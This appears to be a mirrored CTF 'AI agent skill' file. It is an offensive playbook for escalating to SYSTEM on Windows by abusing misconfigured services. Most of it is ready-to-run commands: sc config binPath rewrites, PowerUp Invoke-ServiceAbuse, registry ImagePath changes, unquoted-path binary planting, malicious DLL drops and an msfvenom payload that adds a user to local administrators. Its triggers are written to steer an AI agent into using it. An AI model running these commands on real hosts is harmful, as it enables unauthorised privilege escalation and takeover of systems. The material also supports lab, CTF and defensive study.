# Windows Service Misconfigurations

[Оглавление](https://raw.githubusercontent.com/BigBread57/zametki/main/INDEX.md) · [Происхождение и ограничения](https://raw.githubusercontent.com/BigBread57/zametki/main/SOURCES.md)

> Справочный документ. Инструкции и примеры ниже принадлежат источнику; они не подтверждают состояние вашей системы и не запускаются автоматически. Чтение этого файла не устанавливает скил, инструменты или MCP.

Источники этого текста:

- [Salman0x01/ctf-ai-agent-skills / instructions/host-windows/service-misconfigurations.md](https://github.com/Salman0x01/ctf-ai-agent-skills/blob/0e91c90a7125c6591a56f51276275905f2dfb017/instructions/host-windows/service-misconfigurations.md)

---

---
name: service-misconfigurations
category: host-windows
triggers: ["unquoted service path", "insecure service permissions", "weak binary permissions", "DLL hijacking", "writable service registry", "sc config", "binPath", "accesschk", "SERVICE_CHANGE_CONFIG"]
tools: ["sc", "accesschk.exe", "wmic", "powershell", "icacls", "PowerUp.ps1", "cmd"]
priority: high
description: Enumerate and exploit misconfigured Windows services - insecure permissions, unquoted paths, weak binary/registry ACLs, and DLL hijacking - to run code as SYSTEM.
---
# Windows Service Misconfigurations

## Trigger context
Enumeration (winPEAS/PowerUp) flagged a service you can influence, or you want to hunt manually. Services usually run as `LocalSystem`; changing what they execute, or where they execute from, yields SYSTEM. Assumes a low-priv shell.

## Objective
Cause a SYSTEM-context service to execute an attacker-controlled binary/DLL by abusing one of: (1) modifiable service config, (2) unquoted service path, (3) writable service binary, (4) writable service registry key, or (5) a hijackable DLL search path. Then restart the service.

## Methodology (decision tree)
1. Enumerate services and their run-as accounts and start type.
2. For each candidate check, in order of reliability:
   - Can I reconfigure the service? (`SERVICE_CHANGE_CONFIG` / `SERVICE_ALL_ACCESS`) -> rewrite `binPath`. Most reliable.
   - Is the `ImagePath` unquoted AND contains spaces AND has a writable intermediate directory? -> plant `C:\Program.exe` style binary.
   - Can I overwrite the service binary itself? (writable file, weak ACL) -> replace it.
   - Can I write the service's registry key under HKLM\SYSTEM\CurrentControlSet\Services? -> change ImagePath.
   - Does the service load a DLL from a writable/missing path? -> DLL hijack.
3. Confirm you can (re)start the service - `net stop`/`net start`, `sc stop`/`sc start`, or wait for reboot/`AUTO_START`. No restart path = no win (note it and move on).
4. Verify SYSTEM code execution.

## Commands & payloads
Enumerate services:
```cmd
sc query state= all
wmic service get Name,DisplayName,PathName,StartMode,StartName
sc qc <ServiceName>
```
PowerUp does all service checks at once:
```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile   # writable service binaries
Get-UnquotedService         # unquoted paths
Get-ModifiableService       # reconfigurable services
Invoke-AllChecks
```
(1) Modifiable service config - rewrite binPath (note the required space after `=`):
```cmd
accesschk.exe /accepteula -uwcqv "Users" <ServiceName>
sc config <ServiceName> binPath= "C:\Windows\Temp\rev.exe" obj= LocalSystem
sc config <ServiceName> binPath= "cmd /c net localgroup administrators <user> /add"
sc stop <ServiceName> & sc start <ServiceName>
```
Or via PowerUp helpers:
```powershell
Invoke-ServiceAbuse -Name '<ServiceName>' -Command "net localgroup administrators <user> /add"
```
(2) Unquoted service path - find and exploit:
```cmd
wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
REM e.g. ImagePath = C:\Program Files\Vuln App\service.exe  -> plant these, first writable wins:
REM   C:\Program.exe   |   C:\Program Files\Vuln.exe
accesschk.exe /accepteula -uwdq "C:\Program Files\Vuln App\"
copy rev.exe "C:\Program Files\Vuln App\service.exe"   REM only if that dir is writable
```
(3) Writable service binary - overwrite in place:
```cmd
accesschk.exe /accepteula -quv "C:\Path\service.exe"
icacls "C:\Path\service.exe"
copy /y rev.exe "C:\Path\service.exe"
```
(4) Writable service registry key - change ImagePath:
```cmd
accesschk.exe /accepteula -kvuqsw "HKLM\SYSTEM\CurrentControlSet\Services\<ServiceName>"
reg add "HKLM\SYSTEM\CurrentControlSet\Services\<ServiceName>" /v ImagePath /t REG_EXPAND_SZ /d "C:\Windows\Temp\rev.exe" /f
```
(5) DLL hijacking - find a missing/writable DLL in the service's search path (use Procmon offline, or check known-vuln DLLs), then drop a malicious DLL exporting the needed function:
```cmd
REM place evil DLL earlier in search order (app dir first, then System32, then PATH dirs)
copy evil.dll "C:\Path\In\SearchOrder\needed.dll"
```
Generate a simple SYSTEM-adder service binary (msfvenom):
```bash
msfvenom -p windows/x64/exec CMD='net localgroup administrators <user> /add' -f exe -o rev.exe
```

## Branching logic
- Cannot restart the service and it is not AUTO_START at boot -> record for a post-reboot opportunity; pivot to `token-impersonation-potato` or `credential-hunting`.
- accesschk shows only `SERVICE_QUERY_*` (no CHANGE_CONFIG) -> config rewrite is out; fall back to unquoted-path / binary / registry / DLL vectors.
- Writable directory but not the binary -> unquoted-path plant or DLL hijack.
- Nothing service-related is exploitable -> back to `windows-enum-winpeas` and try another category.

## Common pitfalls
- Forgetting the space after `=` in `sc config binPath= "..."` (syntax fails silently otherwise).
- Service binary must be a real Windows service that reports to the SCM; a plain payload may cause `1053` timeout - the command still often runs before the SCM kills it, but use a service-aware wrapper for reliability.
- Unquoted path only exploitable if an intermediate directory is writable AND the path has a space; a quoted path is not vulnerable.
- Overwriting a running binary fails while the file is locked - stop the service first.
- Restart requires `SERVICE_START`/`SERVICE_STOP`; you may have CHANGE_CONFIG but not restart rights.
- DLL hijack needs the correct exported function or the host process crashes.

## Proof / verification
- Re-run `sc qc <ServiceName>` to confirm the new `BINARY_PATH_NAME`.
- After restart, confirm the payload ran: check `net localgroup administrators`, a dropped file with SYSTEM owner (`icacls`), or your SYSTEM shell's `whoami`.

## Cross-references
- [sa--instructions--host-windows--windows-enum-winpeas.md](https://raw.githubusercontent.com/BigBread57/zametki/main/04-windows/sa--instructions--host-windows--windows-enum-winpeas.md)
- [sa--instructions--host-windows--token-impersonation-potato.md](https://raw.githubusercontent.com/BigBread57/zametki/main/04-windows/sa--instructions--host-windows--token-impersonation-potato.md)
- [sa--instructions--host-windows--uac-and-registry.md](https://raw.githubusercontent.com/BigBread57/zametki/main/04-windows/sa--instructions--host-windows--uac-and-registry.md) (scheduled tasks / autoruns are a related "run as X" vector)

## Credible sources
- HackTricks - Windows Local Privilege Escalation (Services): https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html
- PayloadsAllTheThings - Windows Privilege Escalation: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
- PowerSploit PowerUp: https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
- Microsoft sc.exe reference: https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/sc-config
- HackTricks - DLL Hijacking: https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/dll-hijacking/index.html
